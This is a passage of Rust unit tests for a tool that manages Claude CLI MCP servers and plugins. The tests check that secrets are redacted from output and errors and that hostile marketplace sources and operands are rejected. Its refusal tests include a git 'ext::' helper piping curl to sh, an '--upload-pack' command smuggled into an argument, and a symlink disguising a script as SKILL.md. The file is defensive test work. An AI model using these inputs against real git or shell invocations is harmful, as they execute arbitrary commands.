            cli.plugin_details("helper@market").expect("runs"),
            &plugin_secrets(&snapshot, "helper@market"),
        );

        assert!(!output.contains(SECRET));
    }

    #[test]
    fn a_secret_that_contains_another_is_masked_whole() {
        let server = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({
                "command": "npx",
                "env": {"SHORT": "abc", "LONG": "abc-def-ghi"}
            })),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let (cli, _dir) = cli_printing("LONG=abc-def-ghi");

        let output = redact(
            cli.mcp_get("context7", None).expect("runs"),
            &mcp_secrets(&snapshot, "context7"),
        );

        assert_eq!(output, format!("LONG={MASK}"));
    }

    #[test]
    fn a_plugin_servers_output_is_scrubbed_under_the_name_the_window_sends() {
        let server = McpServer::new(
            "inner",
            McpOrigin::Plugin {
                plugin_id: "helper@market".to_string(),
            },
            config(serde_json::json!({
                "command": "npx",
                "args": ["--token", "sk-pluginargsecret"],
                "env": {"TOKEN": SECRET}
            })),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let (cli, _dir) = cli_printing(&format!(
            "plugin:helper:inner:\n  Args: --token sk-pluginargsecret\n  TOKEN={SECRET}\n"
        ));
        let name = "plugin:helper:inner";

        let output = redact(
            cli.mcp_get(name, None).expect("runs"),
            &mcp_secrets(&snapshot, name),
        );

        assert!(!output.contains(SECRET));
        assert!(!output.contains("sk-pluginargsecret"));
        assert!(output.contains(MASK));
    }

    #[test]
    fn an_error_from_the_cli_is_scrubbed_too() {
        let secrets = vec![SECRET.to_string()];
        let answer: Answer<String> = Err(UiError {
            message: format!("failed with {SECRET}"),
            detail: Some(format!("stderr: TOKEN={SECRET}")),
        });
        let error = scrubbed(answer, &secrets).expect_err("still an error");
        assert!(!error.message.contains(SECRET));
        assert!(!error.detail.expect("detail").contains(SECRET));
    }

    #[test]
    fn another_servers_secret_is_not_gathered() {
        let mine = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"env": {"TOKEN": SECRET}})),
            true,
        );
        let theirs = McpServer::new(
            "other",
            McpOrigin::UserScope,
            config(serde_json::json!({"env": {"TOKEN": "someone-elses"}})),
            true,
        );
        let snapshot = Snapshot {
            mcp_servers: vec![mine, theirs],
            ..Snapshot::default()
        };

        let secrets = mcp_secrets(&snapshot, "context7");
        assert!(secrets.contains(&SECRET.to_string()));
        assert!(!secrets.iter().any(|value| value.contains("someone-elses")));
    }

    #[test]
    fn a_same_named_server_in_another_scope_is_gathered_too() {
        let user = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"env": {"TOKEN": SECRET}})),
            true,
        );
        let project = McpServer::new(
            "context7",
            McpOrigin::ProjectFile {
                project: "/tmp/project".to_string(),
            },
            config(serde_json::json!({"env": {"TOKEN": "project-scoped-secret"}})),
            true,
        );
        let snapshot = Snapshot {
            mcp_servers: vec![user, project],
            ..Snapshot::default()
        };

        let secrets = mcp_secrets(&snapshot, "context7");
        assert!(secrets.contains(&SECRET.to_string()));
        assert!(secrets.contains(&"project-scoped-secret".to_string()));
    }

    #[test]
    fn an_empty_value_is_never_used_as_a_needle() {
        let server = McpServer::new(
            "context7",
            McpOrigin::UserScope,
            config(serde_json::json!({"env": {"BLANK": ""}})),
            true,
        );
        let snapshot = snapshot_with_server(server);
        let secrets = mcp_secrets(&snapshot, "context7");

        assert!(!secrets.iter().any(|value| value.is_empty()));
        assert_eq!(redact("untouched".to_string(), &secrets), "untouched");
    }

    #[test]
    fn a_failed_add_never_puts_the_config_the_cli_echoed_on_screen() {
        let written = config(serde_json::json!({
            "command": "npx",
            "env": {"TOKEN": SECRET},
            "headers": {"Authorization": "Bearer header-secret"}
        }));
        let secrets = secret_values(std::iter::once(&written));

        let answer = scrubbed(
            snapshot_of(Err(CoreError::Cli {
                command: "claude mcp add-json context7 <config redacted> -s user".to_string(),
                stderr: format!(
                    "Invalid server config: {{\"env\":{{\"TOKEN\":\"{SECRET}\"}}}}\n(token {SECRET} rejected, header Bearer header-secret rejected)"
                ),
            })),
            &secrets,
        );

        let error = answer.expect_err("the add failed");
        let detail = error.detail.expect("the stderr reaches the window");
        assert!(!detail.contains(SECRET));
        assert!(!detail.contains("Bearer header-secret"));
        assert!(!error.message.contains(SECRET));
        assert!(detail.contains(MASK));
        assert!(detail.contains("Invalid server config"));
    }

    #[test]
    fn an_unrestorable_server_survives_the_scrub_with_its_settings_readable() {
        let original = config(serde_json::json!({
            "command": "npx",
            "args": ["-y", "@upstash/context7-mcp"],
            "env": {"API_KEY": SECRET}
        }));
        let replacement = config(serde_json::json!({
            "command": "npx",
            "env": {"API_KEY": "the-replacement-value"}
        }));
        let secrets = secret_values([&replacement, &original].into_iter());

        let answer = scrubbed(
            snapshot_of(Err(CoreError::UnrestorableMcpServer {
                name: "context7".to_string(),
                config_json: serde_json::to_string(&original).expect("encode"),
            })),
            &secrets,
        );

        let message = answer.expect_err("the edit failed").message;
        assert!(!message.contains(SECRET));
        assert!(message.contains("context7"));
        assert!(message.contains("npx"));
        assert!(message.contains("@upstash/context7-mcp"));
        assert!(message.contains("API_KEY"));
        assert!(message.contains(MASK));
    }

    fn plugin_with_bundled_secret(plugin_id: &str) -> PluginRecord {
        serde_json::from_value(serde_json::json!({
            "id": plugin_id,
            "installPath": "/tmp/helper",
            "mcpServers": {"inner": {"command": "npx", "env": {"TOKEN": SECRET}}}
        }))
        .expect("decode plugin")
    }

    #[test]
    fn a_failed_uninstall_never_puts_a_bundled_plugin_secret_on_screen() {
        let plugin = plugin_with_bundled_secret("helper@market");
        let snapshot = Snapshot {
            plugins: vec![plugin],
            ..Snapshot::default()
        };
        let secrets = plugin_secrets(&snapshot, "helper@market");

        let answer = scrubbed(
            snapshot_of(Err(CoreError::Cli {
                command: "claude plugin uninstall helper@market -s user".to_string(),
                stderr: format!("could not uninstall: bundled server env TOKEN={SECRET}"),
            })),
            &secrets,
        );

        let error = answer.expect_err("the uninstall failed");
        let detail = error.detail.expect("the stderr reaches the window");
        assert!(!detail.contains(SECRET));
        assert!(detail.contains(MASK));
    }

    #[test]
    fn an_update_failure_and_a_warning_never_carry_a_bundled_plugin_secret() {
        let snapshot = Snapshot {
            plugins: vec![plugin_with_bundled_secret("helper@market")],
            update_failures: vec![fettlr_core::UpdateFailure {
                kind: fettlr_core::UpdateItemKind::Plugin,
                name: "helper@market".to_string(),
                error: format!("could not update: bundled server env TOKEN={SECRET}"),
            }],
            warnings: vec![format!("skipped a server with TOKEN={SECRET}")],
            ..Snapshot::default()
        };

        let converted = UiSnapshot::from(snapshot);

        let error = &converted.update_failures[0].error;
        assert!(!error.contains(SECRET));
        assert!(error.contains(MASK));
        assert!(!converted.warnings[0].contains(SECRET));
        assert!(converted.warnings[0].contains(MASK));
    }

    #[test]
    fn a_failed_set_plugin_enabled_never_puts_a_bundled_plugin_secret_on_screen() {
        let plugin = plugin_with_bundled_secret("helper@market");
        let snapshot = Snapshot {
            plugins: vec![plugin],
            ..Snapshot::default()
        };
        let secrets = plugin_secrets(&snapshot, "helper@market");

        let answer = scrubbed(
            snapshot_of(Err(CoreError::Cli {
                command: "claude plugin enable helper@market -s user".to_string(),
                stderr: format!("could not enable: bundled server env TOKEN={SECRET}"),
            })),
            &secrets,
        );

        let error = answer.expect_err("the enable failed");
        let detail = error.detail.expect("the stderr reaches the window");
        assert!(!detail.contains(SECRET));
        assert!(detail.contains(MASK));
    }

    #[test]
    fn a_failed_edit_scrubs_the_original_config_it_reports_back() {
        let original = config(serde_json::json!({"env": {"TOKEN": SECRET}}));
        let replacement = config(serde_json::json!({"env": {"TOKEN": "the-replacement-value"}}));
        let secrets = secret_values([&replacement, &original].into_iter());

        let answer = scrubbed(
            snapshot_of(Err(CoreError::Cli {
                command: "claude mcp add-json context7 <config redacted> -s user".to_string(),
                stderr: format!("could not put back {{\"env\":{{\"TOKEN\":\"{SECRET}\"}}}}"),
            })),
            &secrets,
        );

        let detail = answer
            .expect_err("the edit failed")
            .detail
            .expect("the stderr reaches the window");
        assert!(!detail.contains(SECRET));
        assert!(detail.contains(MASK));
    }

    #[test]
    fn marketplace_sources_accept_the_shapes_a_marketplace_really_takes() {
        for source in [
            "thomasguillot/fettlr",
            "https://github.com/thomasguillot/fettlr",
            "HTTPS://example.test/repo.git",
            "git@github.com:thomasguillot/fettlr.git",
            "/Users/someone/marketplaces/local",
            "./relative/checkout",
        ] {
            assert!(is_safe_marketplace_source(source), "rejected {source}");
        }
    }

    #[test]
    fn marketplace_sources_refuse_plain_http() {
        for source in [
            "http://example.test/repo.git",
            "HTTP://example.test/repo.git",
            "Http://example.test/repo.git",
            "http://",
            "http:/example.test/repo.git",
        ] {
            assert!(!is_safe_marketplace_source(source), "accepted {source}");
        }
    }

    #[test]
    fn marketplace_sources_refuse_git_remote_helpers_and_flags() {
        for source in [
            "ext::sh -c 'curl example.test | sh'",
            "ext::whoami",
            "--upload-pack=touch /tmp/pwned",
            "-o",
            "",
            "owner/repo extra",
            "transport::address",
            "owner/repo/extra",
            "owner",
        ] {
            assert!(!is_safe_marketplace_source(source), "accepted {source}");
        }
    }

    #[test]
    fn operands_that_read_as_flags_are_refused() {
        assert!(checked_operand("fettlr", "that plugin").is_ok());
        assert!(checked_operand("owner/plugin@marketplace", "that plugin").is_ok());
        assert!(checked_operand("--force", "that plugin").is_err());
        assert!(checked_operand("-s", "that plugin").is_err());
        assert!(checked_operand("", "that plugin").is_err());
        assert!(checked_operand("name\u{7}", "that plugin").is_err());
    }

    #[test]
    fn only_a_real_markdown_file_can_be_opened() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        let skill = dir.path().join("SKILL.md");
        std::fs::write(&skill, "# skill").expect("write skill");
        assert!(checked_markdown(skill.to_str().expect("utf8")).is_ok());

        let agent = dir.path().join("agent.md");
        std::fs::write(&agent, "# agent").expect("write agent");
        assert!(checked_markdown(agent.to_str().expect("utf8")).is_ok());

        let bundle = dir.path().join("Thing.app");
        std::fs::create_dir(&bundle).expect("make bundle");
        assert!(checked_markdown(bundle.to_str().expect("utf8")).is_err());

        let script = dir.path().join("payload.command");
        std::fs::write(&script, "#!/bin/sh\n").expect("write script");
        assert!(checked_markdown(script.to_str().expect("utf8")).is_err());

        let directory = dir.path().join("directory.md");
        std::fs::create_dir(&directory).expect("make dir");
        assert!(checked_markdown(directory.to_str().expect("utf8")).is_err());

        let link = dir.path().join("linked");
        std::fs::create_dir(&link).expect("make dir");
        let disguised = link.join("SKILL.md");
        std::os::unix::fs::symlink(&script, &disguised).expect("symlink");
        assert!(checked_markdown(disguised.to_str().expect("utf8")).is_err());

        let missing = dir.path().join("gone").join("SKILL.md");
        assert!(checked_markdown(missing.to_str().expect("utf8")).is_err());
    }

    #[test]
    fn a_markdown_link_to_a_markdown_file_opens_the_target() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        let target = dir.path().join("dotfiles").join("SKILL.md");
        std::fs::create_dir(target.parent().expect("parent")).expect("make dir");
        std::fs::write(&target, "# skill").expect("write skill");
        let linked = dir.path().join("skills").join("SKILL.md");
        std::fs::create_dir(linked.parent().expect("parent")).expect("make dir");
        std::os::unix::fs::symlink(&target, &linked).expect("symlink");
        let resolved = checked_markdown(linked.to_str().expect("utf8")).expect("accepted");
        assert_eq!(resolved, std::fs::canonicalize(&target).expect("canonical"));
    }
}
